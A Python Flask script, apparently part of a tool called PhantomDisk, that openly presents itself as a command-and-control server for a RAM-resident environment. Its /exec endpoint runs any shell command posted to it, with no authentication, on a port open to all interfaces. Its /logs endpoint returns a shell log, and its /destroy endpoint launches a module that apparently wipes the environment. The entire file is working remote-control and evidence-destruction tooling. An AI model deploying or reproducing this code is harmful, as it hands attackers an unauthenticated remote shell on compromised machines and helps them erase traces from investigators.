#!/usr/bin/env python3
"""
PhantomDisk - Uzaktan Komut & Kontrol (C2Sync)
Geliştirici: burakcanbalta | 2025
Amaç: RAM'de çalışan PhantomDisk ortamını uzaktan yönetmek (komut gönder, log al, ortamı yok et).
"""

from flask import Flask, request, jsonify
import os
import subprocess

app = Flask(__name__)
PHANTOM_PATH = "/mnt/phantomdisk"

@app.route("/exec", methods=["POST"])
def execute():
    data = request.get_json()
    if not data or "cmd" not in data:
        return jsonify({"error": "Komut eksik"}), 400

    cmd = data["cmd"]
    try:
        output = subprocess.getoutput(cmd)
        return jsonify({"output": output})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/logs", methods=["GET"])
def logs():
    log_path = os.path.join(PHANTOM_PATH, "phantom_shell.log")
    if not os.path.exists(log_path):
        return jsonify({"error": "Log bulunamadı"}), 404
    with open(log_path, "r") as f:
        content = f.read()
    return jsonify({"log": content})

@app.route("/destroy", methods=["POST"])
def destroy():
    try:
        subprocess.Popen(["python3", "modules/phantom_destroyer.py"])
        return jsonify({"status": "Yok etme başlatıldı"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8989, debug=False)
